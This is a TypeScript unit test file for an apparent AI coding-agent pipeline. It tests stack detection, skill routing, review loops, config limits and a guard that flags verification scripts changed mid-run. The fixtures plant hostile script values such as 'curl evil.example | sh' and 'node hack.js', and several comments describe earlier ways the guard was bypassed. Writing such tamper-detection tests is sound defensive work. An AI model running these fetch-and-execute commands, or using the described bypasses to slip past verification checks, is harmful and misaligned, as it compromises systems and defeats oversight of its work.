/**
 * Unit tests for the Pi-free logic. Run: `npm test` (node --test, no deps).
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { dirname } from "node:path";
import { fileURLToPath } from "node:url";

import { resolveProfile, listProfiles } from "../src/profiles.ts";
import { applyStackOverride, detectStack, type ProjectStack } from "../src/stack.ts";
import {
  changedScriptKeys,
  digestScripts,
  freezeVerifyInputs,
  resolveVerifyCommands,
  MAX_FROZEN_MANIFESTS,
  type VerifyFreeze,
} from "../src/verify.ts";
import { selectSkills } from "../src/skill-router.ts";
import { decideNextRound, validateReviewResult, type ReviewResult } from "../src/review.ts";
import { normalizeConfig, DEFAULT_CONFIG, type PiBrainConfig } from "../src/config.ts";
import { slugify, splitPlannerOutput } from "../src/workflows/feature.ts";

const PROFILES_DIR = join(dirname(fileURLToPath(import.meta.url)), "..", "profiles");
const fixture = (): string => mkdtempSync(join(tmpdir(), "pi-brain-"));

// --- profiles ---------------------------------------------------------------

test("resolveProfile expands @include, dedups and drops .md suffixes", () => {
  const laravel = resolveProfile(PROFILES_DIR, "laravel");
  assert.ok(laravel.skills.includes("laravel"));
  assert.ok(laravel.skills.includes("code-review"), "should inherit from common");
  assert.ok(laravel.includes.includes("common"));
  assert.equal(new Set(laravel.skills).size, laravel.skills.length, "no duplicates");
  assert.ok(!laravel.skills.some((s) => s.endsWith(".md")));
});

test("every profile in profiles/ resolves", () => {
  for (const p of listProfiles(PROFILES_DIR)) {
    assert.ok(resolveProfile(PROFILES_DIR, p).skills.length > 0, `${p} is empty`);
  }
});

// --- stack detection --------------------------------------------------------

test("detects Laravel from composer + artisan", () => {
  const root = fixture();
  writeFileSync(
    join(root, "composer.json"),
    JSON.stringify({ require: { "laravel/framework": "^12", "pestphp/pest": "^3" } }),
  );
  writeFileSync(join(root, "artisan"), "#!/usr/bin/env php");
  const stack = detectStack(root);
  assert.equal(stack.primary, "laravel");
  assert.ok(stack.confidence >= 0.6);
  assert.ok(stack.capabilities.includes("pest"));
});

test("detects Astro over generic node", () => {
  const root = fixture();
  writeFileSync(join(root, "package.json"), JSON.stringify({ dependencies: { astro: "^5" } }));
  writeFileSync(join(root, "astro.config.mjs"), "export default {}");
  assert.equal(detectStack(root).primary, "astro");
});

test("falls back to nodejs when no framework matches", () => {
  const root = fixture();
  writeFileSync(join(root, "package.json"), JSON.stringify({ dependencies: { fastify: "^5" } }));
  writeFileSync(join(root, "tsconfig.json"), "{}");
  const stack = detectStack(root);
  assert.equal(stack.primary, "nodejs");
  assert.ok(stack.languages.includes("typescript"));
});

// --- verification -----------------------------------------------------------

test("Laravel verification prefers pest and adds configured tools", () => {
  const root = fixture();
  writeFileSync(join(root, "composer.json"), JSON.stringify({ require: { "laravel/framework": "^12" } }));
  writeFileSync(join(root, "artisan"), "");
  const stack = detectStack(root);
  stack.capabilities.push("pest", "pint");
  const cmds = resolveVerifyCommands(root, stack, []);
  assert.match(cmds[0]!.command, /pest/);
  assert.ok(cmds.some((c) => c.command.includes("pint")));
  assert.equal(cmds.find((c) => c.command.includes("pint"))!.blocking, false);
});

test("configured commands win over detection", () => {
  const root = fixture();
  const stack = detectStack(root);
  const cmds = resolveVerifyCommands(root, stack, ["make ci"]);
  assert.deepEqual(cmds.map((c) => c.command), ["make ci"]);
});

test("node verification falls back to tsc when no typecheck script", () => {
  const root = fixture();
  writeFileSync(join(root, "package.json"), JSON.stringify({ scripts: { test: "vitest" } }));
  writeFileSync(join(root, "tsconfig.json"), "{}");
  const cmds = resolveVerifyCommands(root, detectStack(root), []);
  assert.ok(cmds.some((c) => c.command === "npx tsc --noEmit"));
});

// --- manual stack override --------------------------------------------------

const laravelFixture = (): string => {
  const root = fixture();
  writeFileSync(
    join(root, "composer.json"),
    JSON.stringify({
      require: { "laravel/framework": "^12", "pestphp/pest": "^3", "laravel/pint": "^1" },
      "require-dev": { "phpstan/phpstan": "^2" },
    }),
  );
  writeFileSync(join(root, "artisan"), "");
  return root;
};

test("override to the detected stack keeps every capability and package manager", () => {
  const root = laravelFixture();
  const stack = applyStackOverride(detectStack(root), "laravel");
  assert.equal(stack.primary, "laravel");
  assert.equal(stack.confidence, 1);
  assert.ok(stack.capabilities.includes("pest"));
  assert.ok(stack.capabilities.includes("pint"));
  assert.ok(stack.capabilities.includes("phpstan"));
  assert.deepEqual(stack.packageManagers, ["composer"]);
  assert.ok(stack.evidence.includes("primary stack configured in .pi/pi-brain.json"));
});

test("cross-ecosystem override keeps only configured-ecosystem capabilities", () => {
  const root = laravelFixture();
  writeFileSync(
    join(root, "package.json"),
    JSON.stringify({ devDependencies: { vitest: "^3", react: "^19" } }),
  );
  writeFileSync(join(root, "pnpm-lock.yaml"), "");
  const detected = detectStack(root); // laravel wins on laravel/framework + artisan
  assert.equal(detected.primary, "laravel");

  const stack = applyStackOverride(detected, "nodejs");

  assert.equal(stack.primary, "nodejs");
  assert.ok(!stack.capabilities.includes("pest"), "php tooling cannot run in the nodejs profile");
  assert.ok(!stack.capabilities.includes("pint"));
  assert.ok(!stack.capabilities.includes("phpstan"));
  assert.ok(stack.capabilities.includes("vitest"));
  assert.ok(!stack.frameworks.includes("laravel"), "the overridden detection winner is dropped");
  assert.ok(stack.frameworks.includes("react"), "manifest facts survive");
  assert.deepEqual(stack.packageManagers, ["pnpm", "composer"]);
  assert.equal(stack.confidence, 1);
  assert.ok(stack.evidence.includes("primary stack configured in .pi/pi-brain.json"));
});

test("node repo overridden to laravel drops js capabilities and falls back to artisan test", () => {
  const root = fixture();
  writeFileSync(
    join(root, "package.json"),
    JSON.stringify({ devDependencies: { vitest: "^3", jest: "^29" } }),
  );
  const stack = applyStackOverride(detectStack(root), "laravel");
  assert.deepEqual(stack.capabilities, []);
  const cmds = resolveVerifyCommands(root, stack, []);
  assert.deepEqual(cmds.map((c) => c.command), ["php artisan test"]);
});

test("explicit configured verify commands win over overridden-stack capabilities", () => {
  const root = laravelFixture();
  const stack = applyStackOverride(detectStack(root), "laravel");
  const cmds = resolveVerifyCommands(root, stack, ["make ci"]);
  assert.deepEqual(cmds.map((c) => c.command), ["make ci"]);
});

// --- frozen verification inputs (U2, F1) -------------------------------------

const writePackageJson = (root: string, scripts: Record<string, string>): void => {
  writeFileSync(join(root, "package.json"), JSON.stringify({ name: "fixture", scripts }));
};

/**
 * Unwrap a freeze in tests. `freezeVerifyInputs` fails closed with a reason
 * (too many manifests to freeze); a refusal here means the fixture is wrong,
 * so make it loud instead of silently skipping the assertions.
 */
const frozenInputs = (root: string, stack: ProjectStack, configured: string[] = []): VerifyFreeze => {
  const result = freezeVerifyInputs(root, stack, configured);
  if (!result.ok) throw new Error(`unexpected freeze refusal: ${result.reason}`);
  return result.freeze;
};

const writeNestedPackageJson = (root: string, dir: string, scripts: Record<string, string>): void => {
  mkdirSync(join(root, dir), { recursive: true });
  writeFileSync(join(root, dir, "package.json"), JSON.stringify({ name: dir, scripts }));
};

test("freezeVerifyInputs captures the resolved commands, the involved scripts and their digest", () => {
  const root = fixture();
  writePackageJson(root, { test: "vitest run", lint: "eslint .", typecheck: "tsc --noEmit" });
  writeFileSync(join(root, "package-lock.json"), "");

  const freeze = frozenInputs(root, detectStack(root), []);

  assert.deepEqual(
    freeze.commands.map((c) => c.command),
    ["npm run test", "npm run lint", "npm run typecheck"],
  );
  assert.deepEqual(freeze.scripts, {
    "package.json": { test: "vitest run", lint: "eslint .", typecheck: "tsc --noEmit" },
  });
  assert.equal(freeze.scriptsDigest, digestScripts(freeze.scripts));
  assert.match(freeze.scriptsDigest, /^[0-9a-f]{64}$/);
});

test("changedScriptKeys is empty while the scripts are untouched, then names every changed key", () => {
  const root = fixture();
  writePackageJson(root, { test: "vitest run", lint: "eslint ." });
  const freeze = frozenInputs(root, detectStack(root), []);

  writePackageJson(root, { test: "vitest run --changed", lint: "eslint ." }); // value changed
  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);

  writePackageJson(root, { test: "vitest run --changed", lint: "eslint .", pretest: "node hack.js" }); // key added
  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.pretest", "package.json scripts.test"]);

  writeFileSync(join(root, "package.json"), JSON.stringify({ name: "fixture", scripts: {} })); // all removed
  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.lint", "package.json scripts.test"]);

  writePackageJson(root, { test: "vitest run", lint: "eslint ." }); // restored
  assert.deepEqual(changedScriptKeys(root, freeze), []);
});

test("a deleted or malformed manifest is a change against its baseline, not a silent pass", () => {
  const root = fixture();
  writePackageJson(root, { test: "vitest run" });
  const freeze = frozenInputs(root, detectStack(root), []);

  rmSync(join(root, "package.json"));
  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);

  writeFileSync(join(root, "package.json"), "{ not json");
  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);
});

test("Laravel freezes the composer.json scripts section even though the default commands are vendor binaries", () => {
  const root = laravelFixture();
  writeFileSync(
    join(root, "composer.json"),
    JSON.stringify({
      require: { "laravel/framework": "^12", "pestphp/pest": "^3", "laravel/pint": "^1" },
      "require-dev": { "phpstan/phpstan": "^2" },
      scripts: { test: ["@php artisan test"], "post-autoload-dump": "Illuminate\\Foundation\\ComposerScripts::postAutoloadDump" },
    }),
  );
  const stack = applyStackOverride(detectStack(root), "laravel");
  const freeze = frozenInputs(root, stack, []);

  assert.deepEqual(freeze.scripts, {
    "composer.json": { test: ["@php artisan test"], "post-autoload-dump": "Illuminate\\Foundation\\ComposerScripts::postAutoloadDump" },
  });

  writeFileSync(
    join(root, "composer.json"),
    JSON.stringify({
      require: { "laravel/framework": "^12", "pestphp/pest": "^3", "laravel/pint": "^1" },
      "require-dev": { "phpstan/phpstan": "^2" },
      scripts: { test: ["@php artisan test", "echo pwned"] },
    }),
  );
  assert.deepEqual(changedScriptKeys(root, freeze), ["composer.json scripts.post-autoload-dump", "composer.json scripts.test"]);
});

test("explicit config.verify freezes every manifest regardless of the command shape", () => {
  // Reviewer repro (P1): a compound command hid the npm invocation from
  // first-token detection, so a Laravel run froze only composer.json and a
  // hijacked scripts.test passed the guard. Explicit commands are arbitrary
  // shell — no tokenizer can prove what they touch — so both manifests are
  // frozen unconditionally whenever config.verify is set.
  const root = laravelFixture();
  writePackageJson(root, { test: "vitest run" });
  const stack = applyStackOverride(detectStack(root), "laravel");

  for (const command of [
    "true && npm run test",
    "sh -c 'npm run test'",
    "cd pkg && pnpm test",
    "npm --prefix sub run test",
    "yarn workspace pkg run test",
    "composer test",
    "npx tsc --noEmit",
    "make ci",
  ]) {
    const freeze = frozenInputs(root, stack, [command]);
    assert.deepEqual(
      Object.keys(freeze.scripts).sort(),
      ["composer.json", "package.json"],
      `both manifests frozen for explicit command: ${command}`,
    );
  }

  // The exact repro, end to end: the changed test script must be caught now.
  const freeze = frozenInputs(root, stack, ["true && npm run test"]);
  writePackageJson(root, { test: "vitest run --hijacked" });
  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);
});

test("an explicit freeze also detects a manifest created mid-run", () => {
  const root = laravelFixture();
  const stack = applyStackOverride(detectStack(root), "laravel");
  // No package.json at freeze time: the conservative explicit freeze still
  // snapshots it as an empty section, so creating one during the run is a
  // change, not a silent pass.
  const freeze = frozenInputs(root, stack, ["npm run test"]);
  assert.deepEqual(freeze.scripts["package.json"], {});

  writePackageJson(root, { test: "curl evil.example | sh" });
  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);
});

test("stack-default resolution stays ecosystem-scoped", () => {
  // Our own resolved commands are plain single commands: the stack default
  // manifest is enough, and the other ecosystem's manifest stays unfrozen.
  const root = laravelFixture();
  writePackageJson(root, { test: "vitest run" });
  assert.deepEqual(
    Object.keys(frozenInputs(root, detectStack(root), []).scripts),
    ["composer.json"],
    "laravel defaults run composer tooling only",
  );

  const root2 = fixture();
  writePackageJson(root2, { test: "vitest run" });
  writeFileSync(join(root2, "composer.json"), JSON.stringify({ scripts: { ci: "pest" } }));
  const nodeish = applyStackOverride(detectStack(root2), "nodejs");
  assert.deepEqual(
    Object.keys(frozenInputs(root2, nodeish, []).scripts),
    ["package.json"],
    "node defaults run package scripts only — composer.json is not involved",
  );
});

test("explicit config.verify freezes nested manifests: a changed frontend script is caught", () => {
  // Reviewer repro (P1, round 2): `cd frontend && npm run test` froze only the
  // ROOT manifests, so a hijacked frontend/package.json passed the guard. The
  // explicit perimeter must include the subfolder manifests it can reach.
  const root = laravelFixture();
  writePackageJson(root, { test: "vitest run" });
  writeNestedPackageJson(root, "frontend", { test: "vitest run" });
  const stack = applyStackOverride(detectStack(root), "laravel");

  const freeze = frozenInputs(root, stack, ["cd frontend && npm run test"]);
  assert.deepEqual(freeze.scripts["frontend/package.json"], { test: "vitest run" });

  writeNestedPackageJson(root, "frontend", { test: "vitest run --hijacked" });
  assert.deepEqual(changedScriptKeys(root, freeze), ["frontend/package.json scripts.test"]);
});

test("nested manifests are frozen for every explicit shape that can move the perimeter", () => {
  const root = laravelFixture();
  writePackageJson(root, { test: "vitest run" });
  writeNestedPackageJson(root, "frontend", { test: "vitest run" });
  const stack = applyStackOverride(detectStack(root), "laravel");

  for (const command of [
    "cd frontend && npm run test",
    "npm --prefix frontend run test",
    "yarn workspace frontend run test",
    "sh -c 'cd frontend && pnpm test'",
  ]) {
    const freeze = frozenInputs(root, stack, [command]);
    assert.deepEqual(
      Object.keys(freeze.scripts).filter((m) => !["composer.json", "package.json"].includes(m)),
      ["frontend/package.json"],
      `nested manifest frozen for explicit command: ${command}`,
    );
  }

  // A composer.json in a subfolder counts too: same perimeter rule.
  mkdirSync(join(root, "api"), { recursive: true });
  writeFileSync(join(root, "api", "composer.json"), JSON.stringify({ scripts: { ci: "pest" } }));
  const freeze = frozenInputs(root, stack, ["cd api && composer run ci"]);
  assert.deepEqual(freeze.scripts["api/composer.json"], { ci: "pest" });
});

test("the nested scan skips dependency and VCS directories", () => {
  // node_modules/vendor/.git/.pi can hold thousands of manifests; scanning
  // them would be unbounded, so they are excluded (documented limit).
  const root = fixture();
  writePackageJson(root, { test: "vitest" });
  for (const dir of ["node_modules/dep", "vendor/pkg", ".git/objects", ".pi/run", "bower_components/x"]) {
    writeNestedPackageJson(root, dir, { boom: "curl evil.example | sh" });
  }
  writeNestedPackageJson(root, "app", { build: "vite build" });

  const freeze = frozenInputs(root, detectStack(root), ["make ci"]);
  assert.deepEqual(
    Object.keys(freeze.scripts).filter((m) => m.includes("/")),
    ["app/package.json"],
    "no excluded directory contributes a nested manifest",
  );
  assert.deepEqual(Object.keys(freeze.scripts), ["app/package.json", "composer.json", "package.json"]);
});

test("stack-default commands do not freeze nested manifests", () => {
  // Our own resolved commands run from the root: scanning subfolders there
  // would over-freeze the run for no protection.
  const root = fixture();
  writePackageJson(root, { test: "vitest" });
  writeNestedPackageJson(root, "frontend", { test: "vitest" });

  const freeze = frozenInputs(root, detectStack(root), []);
  assert.deepEqual(Object.keys(freeze.scripts), ["package.json"]);
});

test("too many manifests refuse the freeze instead of truncating it", () => {
  // An unbounded perimeter cannot be frozen honestly: truncating would reopen
  // the bypass silently, so the freeze fails closed with a reason.
  const root = fixture();
  writePackageJson(root, { test: "vitest" });
  for (let i = 0; i < MAX_FROZEN_MANIFESTS; i += 1) {
    writeNestedPackageJson(root, join("packages", `p${i}`), { test: "vitest" });
  }

  const result = freezeVerifyInputs(root, detectStack(root), ["make ci"]);
  assert.equal(result.ok, false);
  assert.match(result.ok === false ? result.reason : "", /manifest/i);
});

test("a non-object scripts section captures as empty, matching replay validation", () => {
  // Capture/replay alignment: manifestScripts must never emit an array section
  // (replay rejects those as corrupt, so the program could otherwise generate
  // a freeze it refuses to replay).
  const root = fixture();
  writeFileSync(join(root, "package.json"), JSON.stringify({ name: "fixture", scripts: [] }));

  const freeze = frozenInputs(root, detectStack(root), []);
  assert.deepEqual(freeze.scripts["package.json"], {}, "capture normalizes an array section to {}");

  writePackageJson(root, { test: "boom" });
  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);
});

test("a manifest created after the freeze inside the perimeter is a change", () => {
  // Reviewer repro (P1, round 4): the initial scan resolved EXISTING nested
  // manifests, but a manifest CREATED during the run evaded the check because
  // changedScriptKeys only iterated the baseline paths. The perimeter is now
  // persisted and re-resolved before every verify.
  const root = laravelFixture();
  writePackageJson(root, { test: "vitest run" });
  const stack = applyStackOverride(detectStack(root), "laravel");
  const freeze = frozenInputs(root, stack, ["cd frontend && npm run test"]);
  assert.equal(freeze.perimeter, "tree");
  assert.equal("frontend/package.json" in freeze.scripts, false, "absent at freeze time");

  writeNestedPackageJson(root, "frontend", { test: "curl evil.example | sh" });
  assert.deepEqual(changedScriptKeys(root, freeze), ["frontend/package.json scripts.test"]);
});

test("a nested manifest created in a new subfolder is caught by the re-scan", () => {
  const root = laravelFixture();
  writePackageJson(root, { test: "vitest run" });
  writeNestedPackageJson(root, "packages/a", { build: "vite build" });
  const stack = applyStackOverride(detectStack(root), "laravel");
  const freeze = frozenInputs(root, stack, ["npm run test"]);
  assert.equal("packages/b/package.json" in freeze.scripts, false);

  writeNestedPackageJson(root, "packages/b", { test: "node hack.js" });
  assert.deepEqual(changedScriptKeys(root, freeze), ["packages/b/package.json scripts.test"]);
});

test("the dynamic perimeter check respects a root-only freeze", () => {
  // Stack-default freezes do not scan the tree: a nested manifest appearing is
  // outside their perimeter and must not block unrelated work.
  const root = fixture();
  writePackageJson(root, { test: "vitest" });
  const freeze = frozenInputs(root, detectStack(root), []);
  assert.equal(freeze.perimeter, "root");

  writeNestedPackageJson(root, "frontend", { test: "curl evil.example | sh" });
  assert.deepEqual(changedScriptKeys(root, freeze), []);
});

test("array-valued composer script bodies compare by content, not by reference", () => {
  const root = laravelFixture();
  const composerScripts = { scripts: { test: ["@php artisan test", "@php vendor/bin/pest"] } };
  const writeComposer = (): void => {
    writeFileSync(
      join(root, "composer.json"),
      JSON.stringify({ require: { "laravel/framework": "^12" }, ...composerScripts }),
    );
  };
  writeComposer();
  const stack = applyStackOverride(detectStack(root), "laravel");
  const freeze = frozenInputs(root, stack, []);

  writeComposer(); // identical content, fresh JSON.parse — must NOT count as a change
  assert.deepEqual(changedScriptKeys(root, freeze), []);

  writeFileSync(
    join(root, "composer.json"),
    JSON.stringify({
      require: { "laravel/framework": "^12" },
      scripts: { test: ["@php artisan test", "@php vendor/bin/pest", "curl evil.example | sh"] },
    }),
  );
  assert.deepEqual(changedScriptKeys(root, freeze), ["composer.json scripts.test"]);
});

test("digestScripts is order-independent over manifests and keys", () => {
  const a: Record<string, Record<string, string>> = {
    "package.json": { test: "vitest", lint: "eslint" },
    "composer.json": { ci: "pest" },
  };
  const b: Record<string, Record<string, string>> = {
    "composer.json": { ci: "pest" },
    "package.json": { lint: "eslint", test: "vitest" },
  };
  assert.equal(digestScripts(a), digestScripts(b));
  assert.notEqual(digestScripts(a), digestScripts({ "package.json": { test: "vitest", lint: "eslint ." } }));
});

// --- skill routing ----------------------------------------------------------

const AVAILABLE_SKILLS = (() => {
  const set = new Set(resolveProfile(PROFILES_DIR, "full").skills);
  for (const s of [
    "code-review",
    "karpathy-guidelines",
    "verification-before-completion",
    "feature",
    "grilling",
    "grill-with-docs",
    "product-thinking",
    "to-spec",
    "prototype",
    "research",
    "simplify",
    "tdd",
    "diagnosing-bugs",
    "handoff",
    "start",
    "setup",
    "to-tickets",
    "lessons-gardener",
    "context-audit",
    "long-horizon-brief",
    "improve-codebase-architecture",
  ]) {
    set.add(s);
  }
  return set;
})();

test("each role gets only its categories: developer plans nothing, reviewer reviews", () => {
  const dev = selectSkills(PROFILES_DIR, "nodejs", "developer", AVAILABLE_SKILLS);
  const rev = selectSkills(PROFILES_DIR, "nodejs", "reviewer", AVAILABLE_SKILLS);
  const plan = selectSkills(PROFILES_DIR, "nodejs", "planner", AVAILABLE_SKILLS);

  assert.ok(!dev.skills.includes("feature"), "planning must not reach the developer");
  assert.ok(!dev.skills.includes("grilling"), "planning must not reach the developer");
  assert.ok(!dev.skills.includes("product-thinking"), "planning must not reach the developer");
  assert.ok(!rev.skills.includes("feature"), "planning must not reach the reviewer");
  assert.ok(!plan.skills.includes("code-review"), "review must not reach the planner");
  assert.ok(!plan.skills.includes("simplify"), "review must not reach the planner");
  assert.ok(rev.skills.includes("code-review"), "the reviewer judges code");
  assert.ok(dev.skills.includes("tdd"), "the developer tests");
  assert.ok(dev.skills.includes("diagnosing-bugs"), "the developer debugs");
});

test("no operational skill reaches any pipeline role", () => {
  for (const role of ["planner", "developer", "reviewer", "tester", "security-reviewer"] as const) {
    const sel = selectSkills(PROFILES_DIR, "full", role, AVAILABLE_SKILLS);
    for (const banned of ["handoff", "start", "setup", "to-tickets", "lessons-gardener", "context-audit", "long-horizon-brief", "improve-codebase-architecture"]) {
      assert.ok(!sel.skills.includes(banned), `${banned} must not reach ${role}`);
    }
  }
});

test("context-audit resolves through common and never reaches a pipeline role", () => {
  const common = resolveProfile(PROFILES_DIR, "common");
  assert.ok(common.skills.includes("context-audit"), "context-audit must be listed in common.list");
  const available = new Set(common.skills);
  for (const role of ["planner", "developer", "reviewer", "tester", "security-reviewer"] as const) {
    const sel = selectSkills(PROFILES_DIR, "common", role, available);
    assert.ok(!sel.skills.includes("context-audit"), `context-audit must not reach ${role}`);
    assert.ok(!sel.missing.includes("context-audit"), `context-audit must not surface as missing for ${role}`);
  }
});

test("assessment and report skills stay available in common without entering pipeline roles", () => {
  const common = resolveProfile(PROFILES_DIR, "common");
  const available = new Set(common.skills);
  for (const skill of ["agent-readiness", "html-report"]) {
    assert.ok(available.has(skill), `${skill} must be available to the main session`);
    for (const role of ["planner", "developer", "reviewer", "tester", "security-reviewer"] as const) {
      const selection = selectSkills(PROFILES_DIR, "common", role, available);
      assert.ok(!selection.skills.includes(skill), `${skill} must not reach ${role}`);
      assert.ok(!selection.missing.includes(skill), `${skill} must not be reported missing for ${role}`);
    }
  }
});

test("interactive workflow skills no longer reach any pipeline role", () => {
  // Synthetic profile so every skill under test is present regardless of the
  // real manifests: the routing TABLE is the thing under test.
  const dir = fixture();
  const names = ["feature", "grilling", "grill-with-docs", "product-thinking", "to-spec", "prototype"];
  writeFileSync(join(dir, "routing.list"), names.join("\n") + "\n");
  const available = new Set(names);
  for (const role of ["planner", "developer", "reviewer", "tester", "security-reviewer"] as const) {
    const sel = selectSkills(dir, "routing", role, available);
    for (const banned of ["feature", "grilling", "grill-with-docs"]) {
      assert.ok(!sel.skills.includes(banned), `${banned} must not reach ${role}`);
    }
  }
});

test("the planner keeps the non-interactive planning skills", () => {
  const dir = fixture();
  const names = ["feature", "grilling", "grill-with-docs", "product-thinking", "to-spec", "prototype"];
  writeFileSync(join(dir, "routing.list"), names.join("\n") + "\n");
  const plan = selectSkills(dir, "routing", "planner", new Set(names));
  for (const kept of ["product-thinking", "to-spec", "prototype"]) {
    assert.ok(plan.skills.includes(kept), `${kept} must stay available to the planner`);
  }
});

test("stack skills flow to every role but only within the profile", () => {
  const available = new Set([...resolveProfile(PROFILES_DIR, "laravel").skills, ...AVAILABLE_SKILLS]);
  const dev = selectSkills(PROFILES_DIR, "laravel", "developer", available);
  const rev = selectSkills(PROFILES_DIR, "laravel", "reviewer", available);
  assert.ok(dev.skills.includes("laravel-best-practices"), "stack knowledge reaches the developer");
  assert.ok(rev.skills.includes("laravel-best-practices"), "stack knowledge reaches the reviewer");

  const nodeDev = selectSkills(PROFILES_DIR, "nodejs", "developer", available);
  assert.ok(!nodeDev.skills.some((s) => s.startsWith("laravel")), "no laravel skills in a nodejs project");
  assert.ok(!nodeDev.skills.includes("livewire-development"));
});

test("astro developer gets no laravel skills", () => {
  const available = new Set([
    ...resolveProfile(PROFILES_DIR, "astro").skills,
    ...resolveProfile(PROFILES_DIR, "laravel").skills,
  ]);
  const dev = selectSkills(PROFILES_DIR, "astro", "developer", available);
  assert.ok(!dev.skills.some((s) => s.startsWith("laravel")));
  assert.ok(!dev.skills.includes("livewire-development"));
});

// --- review schema + loop ---------------------------------------------------

const review = (over: Partial<ReviewResult> = {}): ReviewResult => ({
  verdict: "changes_requested",
  summary: "s",
  issues: [{ id: "R1", severity: "blocking", category: "bug", problem: "boom" }],
  ...over,
});

test("validateReviewResult rejects malformed payloads", () => {
  assert.equal(validateReviewResult(null).ok, false);
  assert.equal(validateReviewResult({ verdict: "lgtm", summary: "x", issues: [] }).ok, false);
  assert.equal(validateReviewResult(review()).ok, true);
});

test("approved review completes the loop", () => {
  const d = decideNextRound(review({ verdict: "approved", issues: [] }), 1, 2, new Set(), true);
  assert.equal(d.action, "complete");
});

test("warnings alone do not block completion", () => {
  const r = review({
    verdict: "changes_requested",
    issues: [{ id: "W1", severity: "warning", category: "standards", problem: "meh" }],
  });
  assert.equal(decideNextRound(r, 1, 2, new Set(), true).action, "complete");
});

test("max rounds escalates instead of looping", () => {
  assert.equal(decideNextRound(review(), 2, 2, new Set(), true).action, "escalate");
});

test("same blocking issue with no new diff escalates as no-progress", () => {
  const d = decideNextRound(review(), 1, 3, new Set(["R1"]), false);
  assert.equal(d.action, "escalate");
  assert.match((d as { reason: string }).reason, /no progress/);
});

test("needs_human always escalates", () => {
  assert.equal(decideNextRound(review({ verdict: "needs_human" }), 1, 5, new Set(), true).action, "escalate");
});

// --- misc -------------------------------------------------------------------

test("slugify produces a short kebab slug", () => {
  assert.equal(slugify("Add organization invitations with email acceptance"), "add-organization-invitations-with-email-acceptance");
});

test("splitPlannerOutput separates TITLE, PRD and TASKS", () => {
  const out = splitPlannerOutput(
    "preamble noise\n## TITLE\nPlaywright Flight Provider\n\n## PRD\nbody\n\n## TASKS\n- T1 do it",
  );
  assert.equal(out.title, "Playwright Flight Provider");
  assert.match(out.prd, /body/);
  assert.match(out.tasks, /T1/);
  assert.ok(!out.prd.includes("T1"));
  assert.ok(!out.prd.includes("TITLE"));
});

test("splitPlannerOutput without a TITLE falls back to null", () => {
  const out = splitPlannerOutput("## PRD\nbody\n\n## TASKS\n- T1 do it");
  assert.equal(out.title, null);
  assert.match(out.prd, /body/);
  assert.match(out.tasks, /T1/);
});

// --- config validation ------------------------------------------------------

test("non-numeric budgets fall back to the defaults instead of looping forever", () => {
  const raw = {
    ...DEFAULT_CONFIG,
    maxReviewRounds: "many",
    maxVerifyRetries: -1,
  } as unknown as PiBrainConfig;

  const { config, warnings } = normalizeConfig(raw);

  assert.equal(config.maxReviewRounds, DEFAULT_CONFIG.maxReviewRounds);
  assert.equal(config.maxVerifyRetries, DEFAULT_CONFIG.maxVerifyRetries);
  assert.equal(warnings.length, 2);
  assert.match(warnings[0]!, /maxReviewRounds/);
});

test("an absurdly large budget is capped", () => {
  const { config } = normalizeConfig({ ...DEFAULT_CONFIG, maxReviewRounds: 9999 });
  assert.equal(config.maxReviewRounds, DEFAULT_CONFIG.maxReviewRounds);
});

test("autoCommit can never be turned on from config", () => {
  const { config } = normalizeConfig({ ...DEFAULT_CONFIG, autoCommit: true } as unknown as PiBrainConfig);
  assert.equal(config.autoCommit, false);
});

test("a valid config passes through without warnings", () => {
  const { config, warnings } = normalizeConfig({
    ...DEFAULT_CONFIG,
    maxReviewRounds: 3,
    verify: ["make ci"],
    verbosity: "verbose",
  });
  assert.deepEqual(warnings, []);
  assert.equal(config.maxReviewRounds, 3);
  assert.deepEqual(config.verify, ["make ci"]);
});

// --- verification timeout (F4) ----------------------------------------------

test("verifyTimeoutMs has a finite default and stays on it when absent", () => {
  assert.ok(
    Number.isInteger(DEFAULT_CONFIG.verifyTimeoutMs) && DEFAULT_CONFIG.verifyTimeoutMs > 0,
    "the default must itself be a finite bound",
  );
  const { config, warnings } = normalizeConfig({
    ...DEFAULT_CONFIG,
    verifyTimeoutMs: undefined,
  } as unknown as PiBrainConfig);
  assert.equal(config.verifyTimeoutMs, DEFAULT_CONFIG.verifyTimeoutMs);
  assert.deepEqual(warnings, [], "a missing key is the legacy case, not an error");
});

test("invalid verifyTimeoutMs values fall back to the default with a warning naming the bounds", () => {
  for (const bad of ["soon", 0, 999, 3_600_001, 1.5, -1, null]) {
    const { config, warnings } = normalizeConfig({
      ...DEFAULT_CONFIG,
      verifyTimeoutMs: bad,
    } as unknown as PiBrainConfig);
    assert.equal(config.verifyTimeoutMs, DEFAULT_CONFIG.verifyTimeoutMs, `fallback for ${JSON.stringify(bad)}`);
    assert.ok(
      warnings.some((w) => w.startsWith("verifyTimeoutMs:")),
      `a warning for ${JSON.stringify(bad)}, got ${JSON.stringify(warnings)}`,
    );
  }
});

test("a verifyTimeoutMs inside the allowed bounds passes through unchanged", () => {
  for (const value of [1000, 30_000, 3_600_000]) {
    const { config, warnings } = normalizeConfig({ ...DEFAULT_CONFIG, verifyTimeoutMs: value });
    assert.equal(config.verifyTimeoutMs, value, `pass-through for ${value}`);
    assert.deepEqual(warnings, []);
  }
});

test("a review that says approved while listing blocking issues is not approved", () => {
  const inconsistent: ReviewResult = {
    verdict: "approved",
    summary: "lgtm",
    issues: [{ id: "R9", severity: "blocking", category: "security", problem: "token logged" }],
  };
  const decision = decideNextRound(inconsistent, 1, 2, new Set(), true);
  assert.equal(decision.action, "fix");
});
